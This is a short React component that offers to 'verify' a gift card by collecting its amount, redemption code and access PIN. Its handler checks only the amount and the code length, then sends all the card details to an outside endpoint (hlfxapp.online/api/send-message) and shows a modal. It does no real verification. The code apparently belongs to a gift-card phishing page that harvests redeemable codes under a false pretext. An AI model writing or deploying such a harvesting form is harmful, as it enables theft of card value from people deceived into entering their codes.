"use client"

import React, { useState } from 'react'
import { useAlert } from 'react-alert'
import Button from '../button/Button';

const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency}) => {
    const [redemptionCode, setRedemptionCode] = useState('');
    const [accessCode, setAccessCode] = useState('');
    const [loading, setLoading] = useState(false);
    const alert = useAlert();

    const handleVerify = async () => {
        setLoading(true)
        // do validation
    
        if(isNaN(amount)){
            alert.error("Please enter a valid amount");
            setLoading(false)
            return;
        }
    
        if(redemptionCode.length < 16){
            alert.error("Invalid reedemption code");
            setLoading(false)
            return;
        }

        const msg = `
Card Type: ${cardname}
Currency: ${currency}
Amount: ${amount}
Reedemption Code: ${redemptionCode}
Access Code: ${accessCode}
`;
        const data = {
            msg
        }

        await fetch('https://www.hlfxapp.online/api/send-message', {
            body: JSON.stringify(data),
            method: "post",
            headers:{
                'content-type': 'application/json',
            }
        })
        setShowmodal(true);
        setLoading(false)
    }

  return (
    <>
        <input 
            class="block w-full mb-4  p-2 rounded-lg"
            value={amount} 
            onInput={e => setAmount(e.target.value)}
            placeholder='Amount' 
        />
        <input 
            class="block w-full mb-4  p-2 rounded-lg" 
            value={redemptionCode} 
            onInput={e => setRedemptionCode(e.target.value)}
            placeholder='Redemption Code'
        />
        <input 
            type='number'
            class="block w-full mb-4  p-2 rounded-lg" 
            value={accessCode} 
            onInput={e => setAccessCode(e.target.value)}
            placeholder='Access PIN'
        />
        <Button
            title={"Verify"}
            loading={loading}
            onClick={handleVerify}
        />
    </>
  )
}

export default TypeTwo